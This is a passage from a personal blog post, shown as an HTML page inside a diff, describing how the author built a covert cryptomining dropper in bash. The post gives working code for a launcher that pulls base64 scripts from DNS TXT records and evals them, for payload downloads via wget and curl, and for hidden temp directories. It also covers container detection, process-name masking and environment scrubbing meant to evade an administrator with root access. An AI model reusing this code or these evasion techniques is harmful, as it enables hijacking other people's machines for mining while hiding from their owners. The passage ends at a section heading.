@@ -1,0 +1,883 @@
+<!doctype html> <html lang=en > <meta charset=UTF-8 > <meta name=viewport  content="width=device-width, initial-scale=1"> <link rel=stylesheet  href="/libs/highlight/github.min.css"> <link rel=stylesheet  href="/css/franklin.css"> <link rel=stylesheet  href="/css/main.css"> <link rel=stylesheet  href="/css/menu.css"> <link rel=stylesheet  href="/css/pages.css"> <link rel=stylesheet  href="/css/footer.css"> <link rel=stylesheet  href="/css/responsive.css"> <link rel=stylesheet  href="/css/animations.css"> <link rel=icon  href="/assets/favicon.png"> <!--[if IE ]> <![endif]--> <title>Chronicles of a cryptonote dropper</title> <!DOCTYPE html> <title></title> <body onload="toggle_theme();" class=""> <div class=masthead > <div class=masthead__inner-wrap > <div class=masthead__menu > <a class=site-title  href="/"></a> <div itemscope class=author__wrap  itemtype= "https://schema.org/Person"> <ul> <li onclick="toggle_theme()" class=author__avatar ><img class=flip-front  src= "/assets/appa.png" alt=untoreh-light  itemprop=image > <li class=author__content > <h3 class=author__name  itemprop=name >untoreh</h3> <p class="author__bio .hvr-bubble-float-top" itemprop=description >I am Francesco Giannelli. The website «unto.re» is the place where I put stuff I should remember...or forget. Located in south italy. Born in the early nineties.</p> <li class="author__urls social-icons"> <a href="https://twitter.com/untoreh" rel= "nofollow noopener noreferrer"><i class= "fab fa-fw fa-twitter-square" aria-hidden=true ></i></a> <li class="author__urls social-icons"> <a href="https://github.com/untoreh" rel= "nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden=true ></i></a> <li class="author__urls social-icons"> <a href="mailto:contact@unto.re"><i class= "fas fa-envelope"></i></a> <li itemprop=homeLocation  itemscope itemtype= "https://schema.org/Place" class="author__place hvr-buzz-out"> <div class="author__bio .hvr-bubble-float-top" itemprop=description >I am Francesco Giannelli. The website «unto.re» is the place where I put stuff I should remember...or forget. Located in south italy. Born in the early nineties.</div> <a rel="nofollow noopener noreferrer" href="https://goo.gl/maps/E3Si7WzG4LX7wpNJ6" target=_blank ><i class= "fas fa-fw fa-map-marker-alt" aria-hidden=true ></i><span itemprop=name >italy</span></a> </ul> </div> <nav id=site-nav > <div class=horiz > <ul> <li class="masthead__menu-item hvr-outline-in"> <a href="/posts/"><i class="fas fa-pen menu-icons"></i>posts</a> <li class="masthead__menu-item hvr-outline-in"> <a href="/tag/lightbulbs/"><i class="fas fa-lightbulb menu-icons"></i>bulbs</a> <li class="masthead__menu-item hvr-outline-in"> <a href="/reads/"><i class="fas fa-book menu-icons"></i>reads</a> <li class="masthead__menu-item hvr-outline-in"> <a href="/about/"><i class="fas fa-wrench menu-icons"></i>about</a> </ul> </div><button class=ham ><i class= "fas fa-bars ham-icon"></i></button> <div class=vert > <ul> <li class="masthead__menu-item hvr-outline-in"> <a href="/posts/"><i class="fas fa-pen menu-icons"></i>posts</a> <li class="masthead__menu-item hvr-outline-in"> <a href="/tag/lightbulbs/"><i class="fas fa-lightbulb menu-icons"></i>bulbs</a> <li class="masthead__menu-item hvr-outline-in"> <a href="/reads/"><i class="fas fa-book menu-icons"></i>reads</a> <li class="masthead__menu-item hvr-outline-in"> <a href="/about/"><i class="fas fa-wrench menu-icons"></i>about</a> </ul> </div> </nav> </div> </div> </div> <div> <h1 id=title ><a href="">Chronicles of a cryptonote dropper</a></h1> <blockquote id=page-description  style="font-style: italic;"> ...How far are you willing to go for...pennies? </blockquote> </div> <div class=franklin-content > <p>Assume you want to mine <a href="https://en.wikipedia.org/wiki/Cryptocurrency">cryptocurrencies</a> on remote <em>virtual</em> hardware. You need to find something to mine. Remote servers means, no <a href="https://en.wikipedia.org/wiki/Application-specific_integrated_circuit">ASICS</a> or GPU proof of work algorithms, basically only <a href="\posts/a-few-notes-on-proof-of-work">CPU friendly coins</a>.</p> <h2 id=the_software ><a href="#the_software" class=header-anchor >The software</a></h2> <p>Search and find a <a href="https://github.com/xmrig/xmrig">miner</a>, but it is not really nice, you would like something you can better control from remote, so you find <a href="https://github.com/Bendr0id/xmrigCC">another miner</a>. You also want a <a href="https://github.com/Bendr0id/xmrigcc-proxy">proxy</a>, because many connections will be short lived, you don&#39;t want to <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">dos</a> your mining pool. Also a <a href="https://github.com/search?q&#61;tunnel">tunnel</a> would be nice.</p> <h2 id=the_design ><a href="#the_design" class=header-anchor >The design</a></h2> <p>Some botnets use blockchains data to lookup commands, <a href="https://twitter.com/sarahjamielewis">somebody</a> also appears to have <a href="https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968">lost bets</a> on this not happening again...anyway we are not that sophisticated, we will get by with some DNS records that store a script that pulls the payload which self extract in a temp directory executes and leaves <em>almost</em> no traces of its setup. Here is a small flow chart which depicts the structure</p> <img src="/assets/posts/output/payload.png" alt=""> <h2 id=launcher ><a href="#launcher" class=header-anchor >Launcher</a></h2> <p>The point of a startup script is to be accessible and easily updatable such that it withstands the test of time. Updating <a href="https://en.wikipedia.org/wiki/Domain_Name_System">DNS</a> records is easy, and DNS is the last thing that gets shutdown within a network..because IP addresses are hard to remember...so chances are it is going to be available most of the times. You see when we are <em>fetching the deployment script</em> we are actually already running some logic, this is the launcher script, it needs the ability to perform DNS queries to lookup our records, DNS might be ubiquitous but <a href="https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/">dig</a> is not.</p> <p>There is a little bit of a conundrum here, if we have to download another tool <em>to download another script to download the payload</em> we should just download the payload&#33; In defense...doing this scripty dance adds to obfuscation, allows to keep only one implementation of the launcher &#40;maintainability, yay&#41;, isn&#39;t required most of the times..so we also service a <a href="https://en.wikipedia.org/wiki/Standalone_program">statically linked</a> dig executable to perform dns queries, fetched either by self hosting, or cloud hosting &#40;yes there are fallbacks, like 3 or 4, because cloud services have very minimal free bandwidth, and also require cookies or access tokens...they are very script unfriendly, purposefully so , of course&#41;.</p> <p>What&#39;s in the dns records? We are using <a href="https://en.wikipedia.org/wiki/TXT_record">TXT</a> records, on a custom domain &#40;fallbacks here too&#41;. Why TXT? they happen to be the ones that can store the largest amount of data..usually since it is kind of <a href="https://www.ietf.org/rfc/rfc6763.txt">recommended</a> depending on <em>things</em>. We are specifically using <a href="https://www.cloudflare.com/">cloudflare</a> for our DNS fiddling since it is free, and pretty much the only player in town &#40;<em>well not really but any other alternative pales features wise</em>&#41;. It happens that you can store multiple pieces of data on the <em>same</em> record...this starts getting confusing and scramble for some specifications...&#40;tangent&#41; Cloudflare <a href="https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size">used to</a> allow <em>chained</em> TXT records totaling ~9k bytes, docs now state ~2k bytes, prior to the change I was using ~6k I think, and was serving the script uncompressed, after that I had to thin out the script and compress it before hand &#40;actually I tried to use a <a href="https://freedns.afraid.org/">freedns</a> provider, I was banned within one day, guessing they have a strict no-fat TXT records policy&#41;, however gzip compression appears to NOT be pipe friendly and was still causing problems, so I had to manage to cram the script in without compression &#40;end tangent&#41;.</p> <p>How do we store it? TXT records only support alphanumeric strings, no <a href="https://en.wikipedia.org/wiki/Null_character">NULs</a>, so we have to wrap it into a non null encoding, <a href="https://en.wikipedia.org/wiki/Base64">base64</a> satisfies this constraint, and because we are storing <em>chained</em> TXT records, we have to chunk the output, since we are using shell stuff, this is done through the <code>-w</code> flag, on busybox such flag used to be absent &#40;or opt-in&#41; on older versions which was annoying, an alternative is to use the encoder bundled with openssl, <code>openssl enc -base64</code>.</p> <p>Now that we know how to store our deployment script we store it with either <a href="https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md">cf cli</a> or manually. How do we pull it? We mentioned that we need bindutils or our own <code>dig</code>...after having chosen the serving endpoint, we want to download it, what is available is usually <a href="https://www.gnu.org/software/wget/">wget</a> or <a href="https://curl.se/">curl</a>, wget is found preinstalled much more often, however busybox only provides tls support with dynamic libraries, so you have to make sure the endpoint is serving http or your utility is <code>wget</code> from gnu-utils</p> <pre><code class=language-bash ># the wget command
+wget -t 2 -T 10 -q -i- -O- &gt; &#36;filename &lt;&lt;&lt; &quot;&#36;digurl&quot;</code></pre> <p>It means try <code>-t2</code> times waiting <code>-T10</code> seconds being <code>-q</code> quiet reading from <code>-i-</code> stdin &#40;<code>&#36;digurl</code>&#41; and writing to <code>-O-</code> stdout &#40;<code>&#36;filename</code>&#41;. This command does not reveal what we are downloading on a first glance. We are going to be very careful with other shell commands for the same reason, or sticking with shell &#40;<a href="https://en.wikipedia.org/wiki/Bash_&#37;28Unix_shell&#37;29">bash</a>&#41; built-ins where possible. Take also care about where you are downloading your executables, you want to ensure you can execute them, since some mount points, especially in containers and <code>tmp</code> paths are <code>noexec</code>. Now that we have our dns querying tool we fetch our records</p> <pre><code class=language-bash >dig txt &#36;&#123;record&#125;.&#36;&#123;zone&#125; &#43;short &#43;tcp &#43;timeout&#61;3 &#43;retries&#61;0 &#36;dnsserver</code></pre>
+<p>Flags are self explanatory here, <code>&#43;short</code> just means that we are only interested in the data itself, so that we don&#39;t have to parse the output. It&#39;s important to specify the DNS server, like google &#40;<code>8.8.8.8</code>&#41; or cloudflare &#40;<code>1.1.1.1</code>&#41; ones because many environments redirect or proxy dns queries to their own dns servers by default. After having fetched the chunked script we deal with quotes and whitespaces to make it ready for decoding</p>
+<pre><code class=language-bash >data&#61;&#36;&#123;data//\&quot;&#125; # remove quotes
+data&#61;&#36;&#123;data// &#125; # remove whitespace
+declare -a ar_data
+for l in &#36;data; do
+    ar_data&#91;&#36;&#123;l:0:1&#125;&#93;&#61;&#36;&#123;l:1&#125; # iterate over each line and remove the first characther
+done
+data&#61;&#36;&#123;ar_data&#91;@&#93;&#125; # join all the lines
+data&#61;&#36;&#123;data// &#125; # ensure joining didn&#39;t add whitespace
+# decode
+launcher&#61;&#36;&#40;echo &quot;&#36;launcher&quot; | &#36;b64 -d -w &#36;chunksize&#41;</code></pre>
+<p>What if now we <em>still</em> don&#39;t have our launcher? DNS is messy, we want a fallback, lets setup a subdomain to fetch the launcher script directly. Before evaluating our script we want to customize it, with some variables, again lets use a TXT record to store a NAME&#61;VALUE list of variables and parse it. There is also a fallback for variables, cloudflare offers redirects based on URLs, these redirects are served <em>before</em> the destination, so we don&#39;t need an endpoint, we just want to configure regex based redirect rules to a fictitious endpoint, what we are interested in are the parameters of the url <code>?NAME&#61;VALUE&amp;NAME2&#61;VALUE2...</code>, so that we can parametrize our launcher simply by changing the redirect url, always with attention to quoting and escapes codes</p>
+<pre><code class=language-bash >## m1 also important to stop wget
+pl_vars&#61;&#36;&#40;echo &quot;&#36;token_url&quot; | wget -t 1 -T 3 -q -i- -S 2&gt;&amp;1 | grep -m1 &#39;Location&#39;&#41;
+pl_vars&#61;&#36;&#123;pl_vars#*\/&#125;
+pl_vars&#61;&#36;&#123;pl_vars//\&quot;&amp;/\&quot; &#125;
+pl_vars&#61;&#36;&#123;pl_vars//&#37;3F/\?&#125;</code></pre>
+<p>The wget <code>-S</code> prints the redirect url we are interested in for parsing. Having the parameters and the script, we evaluate the variables writing them over a file</p>
+<pre><code class=language-bash >eval &quot;&#36;pl_vars&quot;
+echo &quot;export \
+&#36;pl_vars \
+&#36;ENV_VARS \
+&quot;&gt;env.sh</code></pre>
+<p>This file will be sourced by are deploy script. The last part of the startup script is to actual <a href="https://en.wikipedia.org/wiki/Trampoline_&#40;computing&#41;">trampoline</a>, evaluate the script within the current shell process, or maybe let it be managed by tmux if possible.</p>
+<pre><code class=language-bash ># printf preserves quotes
+eval &quot;&#36;&#40;printf &#39;&#37;s&#39; &quot;&#36;launcher&quot;&#41;&quot; &amp;&gt;/dev/null
+# or tmux
+echo &quot;&#36;launcher&quot; &gt; &quot;.. &quot;
+tmux send-keys -t miner &quot;. ./\&quot;.. \&quot;&quot; Enter</code></pre>
+<p>The launcher script is dumped to a file named &quot;.. &quot; this looks confusing because it can be mistaken as a <em>parent</em> directory. And we don&#39;t include the session command, as that would linger in the process command, instead we start the tmux session beforehand and send the source command through tmux terminal interface. Related to this, sometimes calling an executable with <code>./</code> keeps those chars in the command, so it is better to add the <code>&#36;PWD</code> to the path..<code>PATH&#61;&#36;PWD:&#36;PATH</code>.</p>
+<h2 id=the_payload ><a href="#the_payload" class=header-anchor >The Payload</a></h2>
+<p>Our deploy script starts by sourcing the <code>env.sh</code> file, and keeping or configured vars as <code>STARTING_*</code> vars like</p>
+<pre><code class=language-bash >STARTING_PATH&#61;&#36;&#123;STARTING_PATH:-&#36;PATH&#125;
+STARTING_PID&#61;&#36;BASHPID</code></pre>
+<p>This allows us to kill and restart a running instance while resetting the environment. Lets switch to a tmp directory with exec capabilities</p>
+<pre><code class=language-bash ># out local subdirectory
+pathname&#61;&#36;&#40;printf &quot;.&#37;-&#36;&#40;&#40;RANDOM&#37;9&#43;1&#41;&#41;s&quot;
+for ph in &#123;/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.local,~/.cache,~/&#125;; do
+    rm -rf &quot;&#36;ph/&#36;pathname&quot; &amp;&amp;
+        mkdir -p &quot;&#36;ph/&#36;pathname&quot; &amp;&amp;
+        tmppath&#61;&quot;&#36;ph/&#36;pathname&quot; &amp;&amp;
+        is_path_executable &quot;&#36;tmppath&quot; &amp;&amp;
+        export PATH&#61;&quot;&#36;&#123;ph&#125;/&#36;pathname:&#36;&#123;PATH&#125;&quot; tmppath &amp;&amp;
+        break
+done
+&#91; -n &quot;&#36;tmppath&quot; &#93; &amp;&amp; cd &quot;&#36;tmppath&quot;</code></pre>
+<p>Checking if within a <a href="https://en.wikipedia.org/wiki/OS-level_virtualization">container</a> is also handy, we can probe the filesystem for hints</p>
+<pre><code class=language-bash >c&#61;&#36;&#40;builtin compgen -G &#39;/etc/cpa*&#39;&#41;
+d&#61;&#36;&#40;builtin compgen -G &#39;/dev/*&#39;&#41;
+s&#61;&#36;&#40;builtin compgen -G &#39;/sys/*&#39;&#41;
+p&#61;&#36;&#40;builtin compgen -G &#39;/proc/*&#39;&#41;
+jail&#61;
+if &#91; -n &quot;&#36;c&quot; -o -z &quot;&#36;d&quot; -o -z &quot;&#36;s&quot; -o -z &quot;&#36;p&quot; &#93;; then ## we are in a jail
+    jail&#61;1
+fi</code></pre>
+<p>Now it&#39;s time to download our payload, we choose to support both wget and curl, we already know how to use wget with careful flags, for curl it is a little bit different. We have to create a config file, and override <code>CURL_HOME</code></p>
+<pre><code class=language-bash >echo &quot;url &#61; &#36;uri
+output &#61; &#36;&#123;name&#125;&#36;&#123;format&#125;
+connect-timeout &#61; 10
+&quot; &gt; .curlrc
+CURL_HOME&#61;&#36;PWD curl -sOL</code></pre>
+<p>Last step is just to extract the payload</p>
+<pre><code class=language-bash >type unzip &amp;&gt;/dev/null &amp;&amp;
+    format&#61;&quot;.zip&quot; extract&#61;&quot;unzip -q&quot; ||
+        format&#61;&quot;.tar.gz&quot; extract&#61;&quot;tar xf&quot;</code></pre>
+<p>It is worth mentioning the use of a &#91;CDN&#93; for servicing the payload. Here again cloudflare to the rescue saves us from bandwidth expenditures. By simply renaming our compressed payload with a <em>file extension</em> supported by cloudflare...it becomes cached. Cloudflare doesn&#39;t check the headers of what it is servicing, maybe because doing so at that scale is simply impractical.</p>
+<h2 id=adventures_down_bashland ><a href="#adventures_down_bashland" class=header-anchor >Adventures down Bashland</a></h2>
+<p>Bash was chosen with the assumption that is portable, doesn&#39;t look too out of place and is more ubiquitous compared to other scripting languages such perl, ruby or python. The truth is that a standalone binary written in golang or lua would have been much easier, with less bugs, and easier to maintain, basically bash was the worst choice possible, in my defense, by the time that I scratched so many itches with bash, it was too late for a rewrite, and it was also getting kind of boring.</p>
+<p>There was also the option to use busybox with the compile time flag to use all builtins &#40;like grep and sed&#41;, however using builtins this way doesn&#39;t allow to spawn jobs &#40;fork&#41; and exposes the daemon to potential deadlocks.</p>
+<p>I will describe some bash functions here, with the full list available <a href="\assets/posts/bash_functions.txt">here</a></p>
+<pre><code class=language-bash >## echo a string long &#36;1 of random lowercase chars
+rand_string&#40;&#41; &#123;
+    local c&#61;0
+    while &#91; &#36;c -lt &#36;1 &#93;; do
+        printf &quot;\x&#36;&#40;printf &#39;&#37;x&#39; &#36;&#40;&#40;97&#43;RANDOM&#37;25&#41;&#41;&#41;&quot;
+        c&#61;&#36;&#40;&#40;c&#43;1&#41;&#41;
+    done
+&#125;</code></pre>
+<p>Use the <code>RANDOM</code> variable to get a number between 97-122 corresponding to a character code, printf should be a builtin, we don&#39;t want to fork within a loop.</p>
+<pre><code class=language-bash >## make a new file descriptor named &#36;1
+newfd&#40;&#41; &#123;
+    eval &quot;local fd&#61;\&#36;&#123;&#36;1&#125;&quot;
+    eval &quot;exec &#36;fd&gt;&amp;-&quot; &amp;&gt;/dev/null
+    local pp&#61;&quot;.&#36;&#40;rand_string 8&#41;&quot;
+    mkfifo &#36;pp
+    unset &quot;&#36;1&quot;
+    eval &quot;exec &#123;&#36;1&#125;&lt;&gt;&#36;pp&quot;
+    # unlink the named pipe
+    rm -f &#36;pp
+&#125;</code></pre>
+<p>Leverage pipes to create anonymous file descriptors, these don&#39;t behave exactly like file descriptors but they are good enough for <a href="https://en.wikipedia.org/wiki/Inter-process_communication">IPC</a>.</p>
+<pre><code class=language-bash >## https://unix.stackexchange.com/a/407383/163931
+fleep&#40;&#41;
+&#123;
+    # log &quot;fleep: called by &#36;&#123;FUNCNAME&#91;1&#93;&#125;&quot;
+    &#91; -n &quot;&#36;&#123;_snore_fd&#125;&quot; -a &quot;&#36;1&quot; &#33;&#61; 0 &#93; ||
+        newfd _snore_fd
+    # log &quot;fleep: starting waiting with &#36;&#123;_snore_fd&#125;&quot;
+    if &#33; command &gt;&amp;&#36;&#123;_snore_fd&#125;; then
+        newfd _snore_fd
+    fi
+    read -t &#36;&#123;1:-1&#125; -u &#36;_snore_fd
+    # log &quot;fleep: ended&quot;
+&#125;</code></pre>
+<p>Sleeping without forking, by abusing the timeout functionality of the read builtin, it uses a dedicated file descriptor and we must ensure that it is available to avoid termination.</p>
+<p>There are functions like <code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> are used to monitor system usage, these all make use of the linux <code>/proc</code> files without tools like <code>ps</code>, so no forking, all pure bash.</p>
+<pre><code class=language-bash >start_coproc&#40;&#41; &#123;
+    local unset
+    while :; do
+        if &#91; &quot;&#36;1&quot; &#61; exec &#93;; then
+            coproc_name&#61;&quot;&#36;2&quot;
+        else
+            coproc_name&#61;&quot;&#36;1&quot;
+        fi
+
+        if &#91; -n &quot;&#36;UNSET_COPROC_VARS&quot; &#93;; then
+            unset&#61;&quot;unset &#36;UNSET_COPROC_VARS;&quot;
+        fi
+
+        log &quot;starting coproc &#36;coproc_name&quot;
+        unset -v &quot;&#36;coproc_name&quot; ## only the variable, not functions
+        eval &quot;coproc &#36;coproc_name &#123; &#36;unset &#36;*; &#125;&quot; # 2&gt;/dev/null
+        unset UNSET_COPROC_VARS
+        wait_coproc &quot;&#36;coproc_name&quot; 3 &amp;&amp; break
+    done
+&#125;
+stop_coproc&#40;&#41; &#123;
+    ## clear fds
+    id_coproc &quot;&#36;1&quot; &amp;&amp; &#91; -n &quot;&#36;job_n&quot; &#93; &amp;&amp; eval &quot;kill -&#36;&#123;2:-9&#125; &#37;&#36;job_n&quot; ||
+        &#123; eval &quot;kill -&#36;&#123;2:-9&#125; \&#36;&#123;&#36;&#123;1&#125;_PID&#125;&quot;; &#125; ||
+        &#123; log &quot;could not kill the specified coprocess with job &#36;job_n&quot; &amp;&amp; return 1; &#125;
+&#125;</code></pre>
+<p>Coprocesses are available since bash <code>v4</code>, they are like jobs except they have a name and their own file descriptors.</p>
+<pre><code class=language-bash >## clear file descriptors
+clear_fds&#40;&#41; &#123;
+    local fd
+    for fd in &#36;&#40;compgen -G &quot;/proc/&#36;BASHPID/fd/*&quot;&#41;; do
+        fd&#61;&#36;&#123;fd/*\/&#125;
+            if &#91;&#91; &#33; &quot; &#36;* &quot; &#61;~ &quot; &#36;&#123;fd&#125; &quot; &#93;&#93;; then
+                case &quot;&#36;fd&quot; in
+                    0|1|2|255|&quot;&#36;_snore_fd&quot;&#41;
+                    ;;
+                    *&#41;
+                        eval &quot;exec &#36;fd&gt;&amp;-&quot;
+                        ;;
+                esac
+            fi
+    done
+&#125;</code></pre>
+<p>We are writing a daemon, which is a long lived process, and we are using many file descriptors, we really want to do some cleanups to avoid incurring in <a href="https://web.archive.org/web/https://linux.die.net/man/5/limits.conf">ulimits</a>.</p>
+<pre><code class=language-bash >## queries ipinfo and gets the current ip and country/region
+parse_ip &#40;&#41;
+&#123;
+    export ip country region;
+    &#91; &#33; -e cfg/geoip.json &#93; &amp;&amp; log &quot;geolocation codes file not found.&quot; &amp;&amp; return 1;
+    ipquery&#61;&#36;&#40;http_req ipinfo.io&#41;;
+    &#91; -z &quot;&#36;ipquery&quot; &#93; &amp;&amp; log &quot;failed querying ipinfo&quot; &amp;&amp; return 1;
+    before_after &#39;ip\&quot;: \&quot;&#39; &quot;&#36;ipquery&quot; &#39;\&quot;&#39;;
+    ip&#61;&#36;&#40;echo &#36;after&#41;;
+    &#91; -z &quot;&#36;ip&quot; &#93; &amp;&amp; log &quot;failed parsing ipinfo data ip&quot; &amp;&amp; return 1;
+    before_after &#39;country\&quot;: \&quot;&#39; &quot;&#36;ipquery&quot; &#39;\&quot;&#39;;
+    country&#61;&#36;&#40;echo &#36;&#123;after,,&#125;&#41;;
+    &#91; -z &quot;&#36;country&quot; &#93; &amp;&amp; log &quot;failed parsing ipinfo data country&quot; &amp;&amp; return 1;
+    while read l; do
+        if &#91; &quot;&#36;&#123;l&#125;&quot; &#33;&#61; &quot;&#36;&#123;l/\&quot;: &#123;&#125;&quot; &#93;; then
+            before_after &#39;&quot;&#39; &quot;&#36;l&quot; &#39;&quot;&#39;;
+            lastregion&#61;&#36;&#40;echo &#36;after&#41;;
+        else
+            if &#91; &quot;&#36;&#123;l&#125;&quot; &#33;&#61; &quot;&#36;&#123;l/\&quot;&#36;&#123;country&#125;\&quot;&#125;&quot; &#93;; then
+                region&#61;&#36;lastregion;
+                break;
+            fi;
+        fi;
+    done &lt; cfg/geoip.json
+&#125;</code></pre>
+<p>This function relies on <a href="https://ipinfo.io/">ipinfo</a> to determine the region of the worker, which allows to tune some region dependent logic, <a href="\assets/posts/geoip.json">geoip.json</a> groups countries into regions, since we want the top level region, and are not interested in the specific country.</p>
+<pre><code class=language-bash ># try to open a connection to host &#36;1 with port &#36;2 and output to &#36;3
+open_connection&#40;&#41; &#123;
+    exec &#123;socket&#125;&lt;&gt;/dev/tcp/&#36;&#123;1&#125;/&#36;&#123;2&#125; 2&gt;/dev/null
+    echo &#36;socket &gt;&amp;&#36;&#123;3&#125;
+&#125;
+
+## check if a tcp connection to &#36;1&#61;&#36;HOST &#36;2&#61;&#36;PORT is successful
+check_connection&#40;&#41; &#123;
+    local host&#61;&#36;1 port&#61;&#36;2 conn_socket&#61;
+    &#91; -z &quot;&#36;host&quot; &#93; &amp;&amp; &#123; echo &#39;no host provided&#39;; return 1; &#125;
+    &#91; -z &quot;&#36;port&quot; &#93; &amp;&amp; &#123; echo &#39;no port provided&#39;; return 1; &#125;
+    newfd conn_socket
+    timeout 3 open_connection &#36;host &#36;port &#36;conn_socket
+    # read the fd of the opened connection from the conn_socket fd and close it
+    read_fd &#36;conn_socket avl -
+    if &#91; -n &quot;&#36;avl&quot; &#93;; then
+        # close connection
+        eval &quot;exec &#36;&#123;avl&#125;&lt;&amp;-&quot; &amp;&gt;/dev/null
+        return 0 ## connection can be established
+    else
+        return 1 ## connection can&#39;t be established
+    fi
+&#125;</code></pre>
+<p>Bash has support for tcp connections, by having an abstraction over <code>/dev/tcp</code> &#40;also for udp, but most it seems to be usually disabled at build time, so you can&#39;t rely on it&#41;. These files are a bash thing, they are not part of the linux <code>/dev</code> tree.</p>
+<p>Worth mentioning also a locking system to handle concurrency between bash jobs. To allow multiple jobs to work with locks they all need to share a file descriptor, so our <code>locker</code> which is also a job, has to be started before other jobs wishing to use the lock. The locker simply reads on <code>stdin</code> waiting for locking requests, responding on <code>stdout</code> depending on the current boolean state stored in a variable. I don&#39;t guarantee that this approach is race free, but seems to work decently, on the other hand, I have found file descriptors to not be very reliable, as I suspect there are some buffers that do not get flushed somewhere down the <em>pipes</em> and eventually hitting deadlocks &#40;which means that you cannot rely on the locker giving you an answer all the times&#41;.</p>
+<pre><code class=language-bash >## unset bash env apart excluded vars/funcs
+clear_env&#40;&#41;&#123;
+    local functions&#61;&#36;&#40;declare -F&#41;
+    functions&#61;&#36;&#123;functions//declare -f &#125;
+    for u in &#36;@; do
+        functions&#61;&#36;&#123;functions/&#36;u&#91;&#91;:space:&#93;&#93;&#125;
+        functions&#61;&#36;&#123;functions/&#91;&#91;:space:&#93;&#93;&#36;u&#125;
+        functions&#61;&#36;&#123;functions/&#91;&#91;:space:&#93;&#93;&#36;u&#91;&#91;:space:&#93;&#93;&#125;
+    done
+    local vars&#61;&#36;&#40;set -o posix; set | while read l; do echo &#36;&#123;l/&#61;*&#125;; done&#41;
+    for u in &#36;@; do
+        vars&#61;&#36;&#123;vars/&#36;u&#91;&#91;:space:&#93;&#93;&#125;
+        vars&#61;&#36;&#123;vars/&#91;&#91;:space&#93;&#93;&#36;u&#125;
+        vars&#61;&#36;&#123;vars/&#91;&#91;:space:&#93;&#93;&#36;u&#91;&#91;:space:&#93;&#93;&#125;
+    done
+    unset -f &#36;functions &amp;&gt;/dev/null
+    unset -v &#36;vars &amp;&gt;/dev/null
+    # unset &#36;vars &amp;&gt;/dev/null
+&#125;
+
+## unexport most variables
+dex_env&#40;&#41; &#123;
+    exported&#61;&#36;&#40;export -p&#41;
+    while read e; do
+        n&#61;&#36;&#123;e/declare -*x &#125;
+        &#91; &quot;&#36;n&quot; &#61; &quot;&#36;e&quot; &#93; &amp;&amp; continue ## multiline var
+        n&#61;&#36;&#123;n/&#61;*&#125;
+        case &quot;&#36;n&quot; in
+            &quot;SHELL&quot;|&quot;USER&quot;|&quot;HOME&quot;|&quot;TMUX&quot;|&quot;CHARSET&quot;|&quot;TERM&quot;&#41;
+                continue
+                ;;
+            *&#41;
+                dexported&#61;&quot;&#36;dexported &#36;&#123;n/&#61;*&#125;&quot;
+        esac
+    done &lt;&lt;&lt;&quot;&#36;exported&quot;
+    export -n &#36;dexported
+&#125;</code></pre>
+<p>Clean up your garbage...complex bash programs end up using many variables, and if you abuse the global space it gets bloaty. If you are spawning shell jobs, they inherit all the environment &#40;which is effectively duplicated, not shared&#41;, you can quickly end up with bash eating <code>100M</code> of memory, not nice. Also we really want to be low profile. In our deployment scenario, the adversary <sup id="fnref:adversary"><a href="#fndef:adversary" class=fnref >[1]</a></sup> can potentially have root access and complete information about our processes <sup id="fnref:infoproc"><a href="#fndef:infoproc" class=fnref >[2]</a></sup> , and you know...every process holds information about the full command that started it, and the exported environment variables.</p>
+<h2 id=configuration ><a href="#configuration" class=header-anchor >Configuration</a></h2>
+<p>Once we have our environment, and our tools, we have to tune our miner for the machine it is running on, configuration steps in pseudo code:</p>
+<ul>
+<li><p>process name for the miner</p>
+
+<li><p>host infos &#40;ram/cores/caches/<code>ENV_VARS</code>&#41;</p>
+
+<li><p>configuration version</p>
+
+<li><p><code>worker_id</code> for the miner &#40;from ip and host&#41;</p>
+
+<li><p>ip/port for the connection</p>
+
+</ul>
+<p>Choosing a name for the process is required to <em>hide</em> the fact that we are running a miner, but we are not just renaming our binary, we have a list of <strong>masks</strong> for potential candidates &#40;a plain text file where each line is a mask&#41;:</p>
+<ul>
+<li><p>pick a mask at random</p>
+
+<li><p>shuffle the elements of the tail of the string &#40;all except the first&#41; to get a diverse process command. Now we have a string looking like <code>cmd --arg2 --arg1 --arg3</code>. This is our miner mask, we run the binary <em>without</em> arguments, but it looks like we started a command <code>cmd</code> with arguments <code>--arg1 --arg2 --arg3</code>. Spaces and dashes are allowed in file names, so it is fine to run a binary named like this, it doesn&#39;t seem linux discerns between the executable and the arguments when storing the process commands.</p>
+<p>The miner configuration is automatically loaded from <code>&#36;PWD</code>.</p>
+
+</ul>
+<h3 id=hashrate ><a href="#hashrate" class=header-anchor >Hashrate</a></h3>
+<p>, with time, the upstream miner got many <strong>automatic tuning</strong> features, so it made part of my scripts redundant, but the difference between upstream and downstream here is that the upstream goal is to maximize <em>performance</em>, while our goal is to maximize <em>efficiency and obfuscation</em>, we do not want to overtake the system, we want to leech a little bit without service disruption. <sup id="fnref:monerominer"><a href="#fndef:monerominer" class=fnref >[3]</a></sup></p>
+<p>For this, we need a more granular understanding of the environment, the <code>l2/l3</code> cache structure of the processor, ram, and cores, and current processor <em>average</em> load and cpu <em>usage</em>. I attempted to build a <a href="https://en.wikipedia.org/wiki/Finite-state_machine">state machine</a> in bash that would start from the bare minimum and try different configurations slowly settling on the average best. It was a <strong>huge</strong> waste of effort littered with <a href="https://en.wikipedia.org/wiki/Technical_debt">technical debt</a> that went bankrupt very quickly and was mostly discarded, with just remnants lingering in the codebase.</p>
+<p>Frack all this auto tuning jumbo, we just made the miner sleep depending on host usage/load, this required miner modifications to <code>sleep</code> between threads yields, and a few fixes to the configuration watchdog <sup id="fnref:configwatch"><a href="#fndef:configwatch" class=fnref >[4]</a></sup>, which would allow us to reload the sleeping amount at runtime. The logic is much more simplified and looks like this:</p>
+<ul>
+<li><p>if usage is above/below &#36;TARGET_USAGE &#40;± margin of error&#41; increase/decrease sleep</p>
+
+<li><p>if average load within <code>1m</code> is above/below &#36;TARGET_LOAD pause/resume mining</p>
+
+</ul>
+<h3 id=connection ><a href="#connection" class=header-anchor >Connection</a></h3>
